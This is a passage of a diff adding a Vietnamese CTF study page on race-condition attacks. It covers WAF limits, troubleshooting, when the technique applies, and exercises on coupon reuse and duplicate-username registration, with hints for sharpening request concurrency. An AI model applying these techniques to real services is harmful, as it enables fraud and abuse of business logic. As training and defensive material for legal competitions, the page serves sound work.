+  <div class="note warn"><span class="tag">Khác biệt quan trọng</span>Race condition không có payload bất thường
+  — mọi request trong cuộc tấn công đều <strong>giống hệt 1 request hợp lệ</strong>, chỉ khác ở việc chúng đến
+  <strong>cùng lúc</strong>. WAF dựa trên nội dung từng request riêng lẻ không có cách nào phân biệt được.</div>
+  <table>
+    <tr><th>Cách hạn chế qua WAF/hạ tầng</th><th>Hiệu quả</th></tr>
+    <tr><td>Rate-limit số request/giây tới cùng 1 endpoint theo session</td><td>Giảm được số request lọt qua trong 1 đợt tấn công, không triệt tiêu hoàn toàn (vẫn có thể có 2 request lọt trong giới hạn rate-limit)</td></tr>
+    <tr><td>Giới hạn số kết nối đồng thời từ 1 session</td><td>Hạn chế kỹ thuật multi-threading cơ bản, nhưng single-packet attack (1 kết nối, nhiều request) vẫn không bị ảnh hưởng</td></tr>
+  </table>
+  <p>Phòng thủ thật sự (thêm lock/transaction atomic trong code) không thể làm trong A/D vì cấm sửa source. Giống
+  IDOR và Type Juggling, đây là nhóm lỗ hổng <strong>thiên về tấn công hơn phòng thủ</strong> trong khuôn khổ cuộc
+  thi.</p>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi không thấy race condition xảy ra</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Mọi lần thử đều chỉ 1 request thành công, dù gửi 20-30 request song song</td><td>App có dùng transaction/lock đúng cách (đã vá) — không có race condition ở đây</td><td>Thử endpoint khác, hoặc thử lại với số lượng request lớn hơn (window race có thể cực hẹp)</td></tr>
+    <tr><td>Thread Python không đủ đồng thời (vẫn tuần tự quan sát qua log server)</td><td>GIL Python hoặc độ trễ TCP handshake riêng từng connection</td><td>Dùng <code>asyncio</code>+<code>aiohttp</code> thay <code>ThreadPoolExecutor</code>, hoặc dùng Turbo Intruder (mục 07) cho kỹ thuật chuẩn hơn</td></tr>
+    <tr><td>Kết quả race condition không ổn định (lúc ăn lúc không)</td><td>Bản chất race condition — phụ thuộc thời điểm, tải server lúc đó</td><td>Thử lại nhiều lần, tăng số request mỗi đợt; trong A/D nên thử ngay đầu round khi server ít tải</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Thao tác "đọc rồi ghi" không atomic (code kiểm tra điều kiện ở 1 câu lệnh, ghi kết quả ở câu lệnh khác, không bọc transaction/lock).</td></tr>
+    <tr><td>❌</td><td>App dùng database transaction đúng cách với mức cô lập (isolation level) đủ nghiêm, hoặc dùng update có điều kiện nguyên tử (vd SQL <code>UPDATE ... WHERE used=false</code> trong 1 câu lệnh, kiểm tra rows affected).</td></tr>
+    <tr><td>❌</td><td>Thao tác có idempotency key bắt buộc và được kiểm tra đúng (mỗi request có ID duy nhất, server từ chối request trùng ID dù gửi đồng thời).</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay bằng Burp (Send group in parallel), đếm số lần
+  coupon được áp dụng thành công.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nếu Burp không có tính năng group, dùng trực tiếp script Python (A) ở
+  mục 08 thay thế.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> endpoint rút tiền kiểm tra số dư đúng cách bằng SQL atomic
+  (<code>UPDATE balance SET amount = amount - 100 WHERE amount >= 100</code>), nhưng endpoint ĐĂNG KÝ username
+  duy nhất lại không atomic. Viết race condition khai thác việc đăng ký trùng username.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Gửi nhiều request đăng ký CÙNG username đồng thời, xem có bao nhiêu
+  tài khoản được tạo thành công với cùng 1 tên — lẽ ra chỉ 1.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> ThreadPoolExecutor với 50 worker vẫn chỉ cho 1 request thành công mỗi lần
+  thử — window race có vẻ rất hẹp. Đề xuất 2 cách cải thiện độ đồng thời mà không cần cài thêm extension Burp.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>(1) Dùng <code>asyncio</code>+<code>aiohttp</code> với cùng 1
+  connection pool, giảm overhead TCP handshake riêng lẻ; (2) Dùng <code>threading.Barrier(n)</code> để đảm bảo
+  tất cả thread đã chuẩn bị xong request mới đồng loạt gọi <code>.send()</code>, thay vì để scheduler Python tự
+  quyết định thứ tự.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>TOCTOU</td><td>Time-Of-Check to Time-Of-Use — khoảng trễ giữa lúc kiểm tra điều kiện và lúc dùng kết quả đó.</td></tr>
+    <tr><td>Atomic (nguyên tử)</td><td>Một thao tác được đảm bảo thực hiện trọn vẹn, không bị xen ngang bởi thao tác khác.</td></tr>
+    <tr><td>Single-packet attack</td><td>Kỹ thuật HTTP/2 gửi nhiều request trong cùng 1 gói TCP để loại bỏ jitter mạng.</td></tr>
+    <tr><td>Idempotency key</td><td>Mã định danh duy nhất cho mỗi thao tác, giúp server nhận ra và từ chối request trùng lặp dù gửi đồng thời.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong>
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Race Condition/</code>, Python <code>concurrent.futures</code>/
+  <code>asyncio</code> (có sẵn), Burp Repeater "Send group in parallel", Turbo Intruder (cần cài trước ngày thi).</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("race-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("race-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
